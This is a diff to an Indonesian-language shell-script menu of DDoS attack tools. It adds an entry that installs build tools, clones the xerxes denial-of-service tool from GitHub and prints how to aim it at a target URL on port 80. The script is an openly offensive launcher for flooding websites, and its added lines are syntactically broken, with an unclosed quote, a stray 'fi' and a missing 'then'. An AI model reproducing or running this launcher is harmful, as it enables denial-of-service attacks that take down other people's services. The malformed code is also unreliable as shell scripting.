@@ -64,7 +64,9 @@ echo $green"2).Ddos attack hammer"
 
 echo $green"3).Ddos attack torshammer"
 
-echo $green"4).Keluar"
+echo $green"4).Ddos attack xerxes"
+
+echo $green"5).Keluar"
 
 echo ""
 
@@ -150,6 +152,21 @@ if [ $ygm = 4 ] || [ $ygm = 4 ]
 then
 
 clear
+
+apt update && apt upgrade -y
+
+apt install git && apt install clang -y
+
+git clone https://github.com/zanyarjamal/xerxes
+
+cd xerxes
+
+echo $red" Caranya: ./xerxes target_url 80
+
+fi
+
+
+if [ $ygm = 5 ] || [ $ygm = 5 ]
 
 sh recode.sh
 
